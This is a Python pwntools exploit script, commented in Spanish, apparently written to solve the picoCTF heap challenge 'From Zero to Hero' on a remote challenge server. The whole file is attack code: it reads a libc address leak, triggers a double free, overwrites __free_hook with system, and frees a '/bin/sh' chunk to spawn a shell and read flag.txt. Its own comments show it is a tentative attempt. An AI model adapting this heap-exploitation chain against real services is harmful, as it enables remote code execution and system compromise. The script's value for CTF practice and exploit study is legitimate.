#!/usr/bin/env python3

from pwn import *

HOST = 'jupiter.challenges.picoctf.org'
PORT = 29476

context.log_level = 'info'
context.arch = 'amd64'

p = remote(HOST, PORT)

# Diálogo
p.recvuntil(b'From Zero to Hero')
p.sendline(b'y')
p.recvuntil(b'Really?')
p.sendline(b'y')

# Leak
p.recvuntil(b'Take this: ')
leak = p.recvline().strip()
leak_addr = int(leak, 16)
log.info(f"Leak: 0x{leak_addr:x}")

# Calcular libc
libc_base = leak_addr - 0x21fd0
log.info(f"Libc: 0x{libc_base:x}")

# El menú ya está presente
p.recvuntil(b'>')

# Ahora sí podemos interactuar
# Crear un superpower
p.sendline(b'1')
response = p.recvuntil(b'length')
log.info(f"Got: {response}")

p.sendline(b'100')
response = p.recvuntil(b'description')
log.info(f"Got: {response}")

p.sendline(b'A'*100)
response = p.recvuntil(b'>')
log.info(f"Got: {response}")

# Crear otro
p.sendline(b'1')
p.recvuntil(b'length')
p.sendline(b'100')
p.recvuntil(b'description')
p.sendline(b'B'*100)
p.recvuntil(b'>')

# Ahora intentar double free
p.sendline(b'2')
p.recvuntil(b'remove')
p.sendline(b'0')
p.recvuntil(b'>')

p.sendline(b'2')
p.recvuntil(b'remove')
p.sendline(b'1')
p.recvuntil(b'>')

# Double free del primero
p.sendline(b'2')
p.recvuntil(b'remove')
p.sendline(b'0')  # Double free!

# Esto debería crashear o dar error
try:
    response = p.recvuntil(b'>', timeout=2)
    log.info(f"After double free: {response}")
except:
    log.info("Program crashed or no response")

# Si llegamos aquí, intentar explotar
# Allocar con dirección controlada
free_hook = libc_base + 0x1e75a8
system = libc_base + 0x4f4e0

p.sendline(b'1')
p.recvuntil(b'length')
p.sendline(b'100')
p.recvuntil(b'description')
p.sendline(p64(free_hook) + b'C'*92)
p.recvuntil(b'>')

p.sendline(b'1')
p.recvuntil(b'length')
p.sendline(b'100')
p.recvuntil(b'description')
p.sendline(b'D'*100)
p.recvuntil(b'>')

p.sendline(b'1')
p.recvuntil(b'length')
p.sendline(b'100')
p.recvuntil(b'description')
p.sendline(b'E'*100)
p.recvuntil(b'>')

# El siguiente alloc debería ser en free_hook
p.sendline(b'1')
p.recvuntil(b'length')
p.sendline(b'8')
p.recvuntil(b'description')
p.sendline(p64(system))
p.recvuntil(b'>')

# Crear "/bin/sh"
p.sendline(b'1')
p.recvuntil(b'length')
p.sendline(b'8')
p.recvuntil(b'description')
p.sendline(b'/bin/sh\x00')
p.recvuntil(b'>')

# Free para trigger system("/bin/sh")
p.sendline(b'2')
p.recvuntil(b'remove')
p.sendline(b'7')

# Shell!
p.sendline(b'cat flag.txt')

try:
    flag = p.recvline_contains(b'pico', timeout=2)
    log.success(f"FLAG: {flag.decode()}")
except:
    log.info("Trying to get output...")
    try:
        output = p.recvall(timeout=2)
        if b'pico' in output.lower():
            log.success(f"Found: {output}")
        else:
            log.info(f"Output: {output}")
    except:
        p.interactive()

p.close()